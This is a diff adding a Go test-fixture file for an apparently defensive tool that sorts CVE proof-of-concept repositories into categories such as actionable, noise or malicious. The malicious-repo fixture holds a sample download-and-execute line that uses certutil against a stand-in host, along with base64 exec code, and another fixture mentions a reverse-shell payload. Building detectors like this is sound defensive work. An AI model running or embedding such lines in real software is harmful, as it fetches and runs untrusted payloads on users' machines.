@@ -1,0 +1,234 @@
+package triage
+
+import (
+	"strings"
+)
+
+// CheckResult 单个自检场景的判定结果
+type CheckResult struct {
+	Name      string    // 场景描述
+	Expect    []Verdict // 期望结论（任一命中即 PASS）
+	Got       Verdict
+	Score     int      // 总分
+	CVEScore  int      // CVE 层分（展示用）
+	RepoScore int      // Repo 层分（展示用）
+	Reasons   []string // 完整判定理由
+	Pass      bool
+}
+
+// SelfCheck 六个验收场景：KEV 在野利用 / 实验室漏洞 / AI 空壳 / Mass 扫描器 /
+// 恶意仓库 / 高危漏洞暂无 PoC。纯离线，不访问网络。
+func SelfCheck() []CheckResult {
+	return []CheckResult{
+		runCase("KEV 名单内在野利用漏洞 + 高质量武器化仓库", []Verdict{VerdictACT}, kevCVE(), kevRepo()),
+		runCase("AV:L + PR:H + 竞态 + 纯 DoS + 描述含 theoretical", []Verdict{VerdictLabOnly}, labCVE(), labRepo()),
+		runCase("AI 生成空壳假 PoC（长README+大量emoji+零代码+马甲号）", []Verdict{VerdictNoise}, aiShellCVE(), aiShellRepo()),
+		runCase("批量生成的 Mass-Scanner 版本扫描器", []Verdict{VerdictWatch, VerdictNoise}, scannerCVE(), scannerRepo()),
+		runCase("伪装成 PoC 的恶意仓库（exe+base64+exec+比特币地址）", []Verdict{VerdictMalicious}, maliciousCVE(), maliciousRepo()),
+		runCase("免认证 RCE 但 EPSS 极低、E:U、暂无可信 PoC", []Verdict{VerdictWatch}, unauthRCECVE(), unauthRCERepo()),
+	}
+}
+
+func runCase(name string, wants []Verdict, cve CVEMeta, repo RepoMeta) CheckResult {
+	got, total, reasons := Triage(cve, repo)
+	cveScore, _, _ := scoreCVE(cve)
+	repoScore, _, _ := scoreRepo(repo)
+	pass := false
+	for _, w := range wants {
+		if got == w {
+			pass = true
+			break
+		}
+	}
+	wantStr := make([]string, 0, len(wants))
+	for _, w := range wants {
+		wantStr = append(wantStr, string(w))
+	}
+	return CheckResult{
+		Name: name, Expect: wants, Got: got, Score: total,
+		CVEScore: cveScore, RepoScore: repoScore, Reasons: reasons, Pass: pass,
+	}
+}
+
+// Describe 输出场景期望（供自检脚本打印）
+func (c CheckResult) Describe() string {
+	return strings.Join(mapSlice(c.Expect, func(v Verdict) string { return string(v) }), " 或 ")
+}
+
+func mapSlice[T, R any](in []T, f func(T) R) []R {
+	out := make([]R, 0, len(in))
+	for _, v := range in {
+		out = append(out, f(v))
+	}
+	return out
+}
+
+func bptr(b bool) *bool       { return &b }
+func fptr(f float64) *float64 { return &f }
+func iptr(i int) *int         { return &i }
+
+// ---------- 场景 1：KEV 在野利用 + 高质量仓库 → ACT ----------
+
+func kevCVE() CVEMeta {
+	return CVEMeta{
+		CVEID: "CVE-2026-77777", InKEV: bptr(true),
+		CVSSVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", CVSSScore: 9.8,
+		EPSS: fptr(0.97), EPSSPercentile: fptr(0.99), CWE: []int{89}, Automatable: bptr(true),
+		Description: "SQL injection in the login API allows unauthenticated attackers to execute arbitrary SQL commands and dump the entire database.",
+	}
+}
+
+func kevRepo() RepoMeta {
+	return RepoMeta{
+		FullName:    "watchtowr/cves-2026-77777",
+		Description: "Watchtowr Labs analysis and working exploit for CVE-2026-77777",
+		Stars:       120, Forks: 23, Watchers: 40,
+		CreatedAt: "2026-08-01T09:00:00Z", PushedAt: "2026-08-20T09:00:00Z",
+		OwnerCreatedAt: "2019-05-01T00:00:00Z", OwnerPublicRepos: iptr(42),
+		Readme: "Watchtowr Labs analysis and working exploit for CVE-2026-77777.\n\n" +
+			"## Usage\n\npython exploit.py --target http://target --mode verify\n\n" +
+			"The payload triggers a reverse shell; run whoami on the victim box to confirm the interactive shell.",
+		Files: []FileEntry{{
+			Path: "exploit.py", Size: 3487,
+			ContentSnippet: "io = remote(host, port)\nio.sendline(payload)\nprint(io.recvall().decode())\nimport os\nos.system('echo verifying shell access')",
+		}},
+	}
+}
+
+// ---------- 场景 2：AV:L + PR:H + 竞态 + 纯 DoS + theoretical → LAB_ONLY ----------
+
+func labCVE() CVEMeta {
+	return CVEMeta{
+		CVEID:      "CVE-2026-11111",
+		CVSSVector: "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:H", CVSSScore: 4.4,
+		CWE: []int{362}, ImpactType: "availability",
+		Description: "A race condition in the local print spooler driver allows an attacker with local access to crash the system " +
+			"(denial of service). Exploitation is theoretical and only practical within a narrow timing window in controlled lab environments.",
+	}
+}
+
+func labRepo() RepoMeta {
+	return RepoMeta{
+		FullName:    "someone/cve-2026-11111-notes",
+		Description: "Notes about CVE-2026-11111",
+		Stars:       0, Forks: 0,
+		CreatedAt: "2026-08-01T09:00:00Z", PushedAt: "2026-08-05T09:00:00Z",
+		OwnerCreatedAt: "2024-01-01T00:00:00Z", OwnerPublicRepos: iptr(3),
+		Readme: "Just my research notes. The bug is theoretical, nobody cares.",
+		Files: []FileEntry{{
+			Path: "notes.md", Size: 400,
+			ContentSnippet: "winning the race condition requires debug port access on the machine under test",
+		}},
+	}
+}
+
+// ---------- 场景 3：AI 生成空壳假 PoC → NOISE ----------
+
+func aiShellCVE() CVEMeta {
+	return CVEMeta{
+		CVEID:      "CVE-2024-12345",
+		CVSSVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", CVSSScore: 6.5,
+		EPSS: fptr(0.02), CWE: []int{79},
+		Description: "A stored cross-site scripting issue was discovered in the admin dashboard of the application.",
+	}
+}
+
+func aiShellRepo() RepoMeta {
+	readme := strings.Repeat(
+		"This awesome project readme is auto generated by an AI writing assistant and explains the installation guide in detail for every platform. ", 12)
+	readme += "🚀 🔥 ✅ ⭐ 💥 🧠 🎯 🛡️ ⚡ 🎉 💡 🔥\n\nGive it a star if you like it!"
+	return RepoMeta{
+		FullName:    "quick-poc-maker/CVE-2024-12345-poc",
+		Description: "PoC for CVE-2024-12345",
+		Stars:       1, Forks: 0, Watchers: 1,
+		CreatedAt: "2026-09-01T10:00:00Z", PushedAt: "2026-09-01T18:00:00Z",
+		OwnerCreatedAt: "2026-08-29T10:00:00Z", OwnerPublicRepos: iptr(2),
+		Readme: readme,
+		Files:  []FileEntry{{Path: "README.md", Size: 2400}},
+	}
+}
+
+// ---------- 场景 4：批量生成的 Mass-Scanner 版本扫描器 → WATCH / NOISE ----------
+
+func scannerCVE() CVEMeta {
+	return CVEMeta{
+		CVEID:      "CVE-2024-0422",
+		CVSSVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:W/RC:R", CVSSScore: 9.8,
+		EPSS: fptr(0.35), CWE: []int{78}, Automatable: bptr(true),
+		Description: "An unauthenticated remote code execution vulnerability in the web management console allows command injection via crafted HTTP requests.",
+	}
+}
+
+func scannerRepo() RepoMeta {
+	return RepoMeta{
+		FullName:    "batch-poc-factory/CVE-2024-0422-mass-scanner",
+		Description: "Mass scanner for CVE-2024-0422",
+		Stars:       0, Forks: 0, Watchers: 0,
+		CreatedAt: "2026-08-30T02:00:00Z", PushedAt: "2026-08-30T11:00:00Z",
+		OwnerCreatedAt: "2025-01-01T00:00:00Z", OwnerPublicRepos: iptr(5),
+		Readme: "This tool performs a mass scan across /24 networks. It checks if each host runs a vulnerable version " +
+			"by grabbing the HTTP banner to fingerprint the service and determine the version. It scans targets in parallel.",
+		Files: []FileEntry{{
+			Path: "scanner.py", Size: 900,
+			ContentSnippet: "resp = http_get(target)\nprint('version:', parse_banner(resp))\nif ok: results.append(target)",
+		}},
+	}
+}
+
+// ---------- 场景 5：伪装成 PoC 的恶意仓库 → MALICIOUS ----------
+
+func maliciousCVE() CVEMeta {
+	return CVEMeta{
+		CVEID:      "CVE-2026-31337",
+		CVSSVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", CVSSScore: 9.8,
+		EPSS: fptr(0.08), CWE: []int{94},
+		Description: "Remote code execution vulnerability in the file parser allows attackers to run commands.",
+	}
+}
+
+func maliciousRepo() RepoMeta {
+	return RepoMeta{
+		FullName:    "S4t0sh1/CVE-2026-31337-EXP",
+		Description: "100% working exploit, just clone and run!",
+		Stars:       0, Forks: 0, Watchers: 0,
+		CreatedAt: "2026-09-01T02:00:00Z", PushedAt: "2026-09-01T16:00:00Z",
+		OwnerCreatedAt: "2026-08-25T00:00:00Z", OwnerPublicRepos: iptr(1),
+		Readme: "# CVE-2026-31337 PoC\n\nJust clone and run! 100% working!\n\n" +
+			"Donate BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n" +
+			"Or send ETH to 0xfa1c2b3a4d5e6f70819a2b3c4d5e6f70819a2b3c\n" +
+			"Join our telegram channel for the wallet bonus!",
+		Files: []FileEntry{
+			{Path: "payload.exe", Size: 53248, ContentSnippet: "MZ binary blob"},
+			{
+				Path: "run.py", Size: 210,
+				ContentSnippet: "import base64\nexec(base64.b64decode(payload))\nsubprocess.Popen('certutil -urlcache -f https://cdn.example.com/svchost.exe svc.exe', shell=True)",
+			},
+		},
+	}
+}
+
+// ---------- 场景 6：免认证 RCE 但 EPSS 极低、E:U、暂无可信 PoC → WATCH ----------
+
+func unauthRCECVE() CVEMeta {
+	return CVEMeta{
+		CVEID:      "CVE-2026-00001",
+		CVSSVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:OF/RC:C", CVSSScore: 9.8,
+		EPSS: fptr(0.003), EPSSPercentile: fptr(0.15), CWE: []int{94}, Automatable: bptr(true),
+		Description: "An unauthenticated remote code execution vulnerability exists in the file upload component. " +
+			"Remote attackers can run arbitrary commands by uploading a crafted archive to the affected endpoint.",
+	}
+}
+
+func unauthRCERepo() RepoMeta {
+	return RepoMeta{
+		FullName:    "vulnwatcher-bot/cve-2026-00001",
+		Description: "Advisory summary",
+		Stars:       3, Forks: 1, Watchers: 2,
+		CreatedAt: "2026-07-20T09:00:00Z", PushedAt: "2026-07-25T09:00:00Z",
+		OwnerCreatedAt: "2023-01-01T00:00:00Z", OwnerPublicRepos: iptr(30),
+		Readme: "Advisory summary for CVE-2026-00001 affecting ProductServer 2.3.0.\n\n" +
+			"The vendor has released a fixed build. Administrators are advised to upgrade to 2.3.1 as soon as possible.\n\n" +
+			"References: vendor bulletin, mailing list discussion.",
+		Files: []FileEntry{{Path: "README.md", Size: 420}},
+	}
+}
